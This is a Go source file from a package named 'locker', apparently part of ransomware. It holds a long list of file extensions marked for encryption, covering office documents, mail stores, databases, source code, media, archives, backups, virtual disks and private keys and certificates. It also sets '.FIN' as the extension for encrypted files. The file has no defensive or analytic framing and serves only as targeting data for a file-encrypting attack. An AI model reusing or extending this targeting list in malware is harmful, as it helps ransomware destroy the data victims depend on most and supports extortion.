package locker

// FileExt to encrypt.
var FileExt = [...]string{
	".DOC", ".DOCX", ".XLS", ".XLSX", ".PPT",
	".PPTX", ".PST", ".OST", ".MSG", ".EML", ".VSD", ".VSDX", ".TXT", 
	".CSV", ".RTF", ".WKS", ".WK1", ".PDF", ".DWG", ".ONETOC2", ".SNT", 
	".JPEG", ".JPG", ".DOCB", "DOCM", ".DOT", ".DOTM", ".DOTX", ".XLSM", 
	".XLSB", ".XLW", ".XLT", ".XLM", ".XLC", ".XLTX", ".XLTM", ".PPTM", 
	".POT", ".PPS", ".PPSM", ".PPSX", ".PPAM", ".POTX", ".POTM", ".EDB", 
	".HWP", ".62", ".SXI", ".STI", ".SLDX", ".SLDM", ".VDI", ".VMDK", ".VMX",
	".GPG", ".AES", ".ARC", ".PAQ", ".BZ2", ".TBK", ".BAK", ".TAR", ".TGZ", ".GZ",
	".7Z", ".RAR", ".ZIP", "BACKUP", ".ISO", ".VCD", ".BMP", ".PNG", ".GIF", ".RAW",
	".CGM", ".TIF", ".TIFF", ".NEF", ".PSD", ".AI", ".SVG", ".DJVU", ".M4U", ".M3U",
	".MID", ".WMA", ".FLV", ".3G2", ".MKV", ".3GP", ".MP4", ".MOV", ".AVI", ".ASF", 
	".MPEG", ".VOB", ".MPG", ".WMV", ".FLA", ".SWF", ".WAV", ".MP3", ".SH", ".CLASS",
	".JAR", ".JAVA", ".RB", ".ASP", ".PHP", ".JSP", ".BRD", ".SCH", ".DCH", ".DIP", ".PL",
	".VB", ".VBS", ".PS1", ".BAT", ".CMD", ".JS", ".ASM", ".H", ".PAS", ".CPP", ".C", ".CS",
	".SUO", ".SLN", ".LDF", ".MDF", ".IBD", ".MYI", ".MYD", ".FRM", ".ODB", ".DBF", ".DB", ".MDB",
	".ACCDB", ".SQL", ".SQLITEDB", ".SQLITE3", ".ASC", ".LAY6", ".LAY", ".MML", ".SXM", ".OTG", ".ODG",
	".UOP", ".STD", ".SXD", ".OTP", ".ODP", ".WB2", ".SLK", ".DIF", ".STC", ".SXC", ".OTS", ".ODS",
	".3DM", ".MAX", ".3DS", ".UOT", ".STW", ".SXW", ".OTT", ".ODT",
	".PEM", ".P12", ".CSR", ".CRT", ".KEY", ".PFX", ".DER",
}

const (
	// CryptoExt holds the file extension for the encrypted files.
	CryptoExt = ".FIN"
)
